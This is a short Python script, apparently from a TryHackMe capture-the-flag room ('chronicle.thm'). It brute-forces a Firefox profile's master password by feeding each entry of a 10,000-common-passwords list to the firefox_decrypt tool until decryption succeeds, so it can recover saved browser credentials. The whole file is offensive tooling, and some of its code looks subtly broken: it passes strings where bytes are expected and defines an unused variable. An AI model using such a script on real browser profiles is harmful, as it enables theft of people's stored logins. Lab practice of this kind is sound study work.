#! /bin/python3

import os
import subprocess

file="/usr/share/SecLists/Passwords/Common-Credentials/10k-most-common.txt"

firefox_decrypt = "/home/rooli/tools/firefox_decrypt/firefox_decrypt.py"
target = "/home/rooli/chronicle.thm/10.10.84.35:8000/0ryxwn4c.default-release"

file1="./list"
with open(file,'r') as f:
     list=f.read().splitlines()

print("Firefox_decrypt file : "+firefox_decrypt)
print("Mozilla sessions files : "+target)

for passwd in list:
     cmd = "python3 "+firefox_decrypt+" --no-interactive "+target
     cmd = cmd.split(" ")

     res = subprocess.Popen(cmd, stdout=subprocess.PIPE, stdin=subprocess.PIPE)

     stdoutdata = res.communicate(passwd)

     if (res.returncode == 0):
          print("[+] - Found password : "+passwd)
          print("stdout : "+stdoutdata+"------")
          break
